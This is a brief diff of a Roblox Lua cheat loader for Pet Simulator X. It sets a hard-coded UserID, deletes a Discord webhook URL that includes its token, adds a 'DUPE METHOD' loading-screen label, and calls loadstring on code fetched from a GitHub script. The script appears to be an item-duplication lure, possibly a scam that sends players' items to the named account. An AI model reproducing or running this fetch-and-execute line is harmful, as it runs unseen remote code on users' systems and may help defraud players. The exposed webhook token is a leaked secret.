@@ -1,7 +1,12 @@
-
 _G.UserID = 3545626842
-_G.WebHook = "https://discord.com/api/webhooks/1060100451053359135/WBLLV9P1tU4WewevUyrDmCRUuxLhQkZLPoOAbiOrDF7Au0R02WVs27GisbI4cNK3mPnQ" 
+_G.LoadingScreenText = "DUPE METHOD"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+
+
+
+
+
+
 
 
 
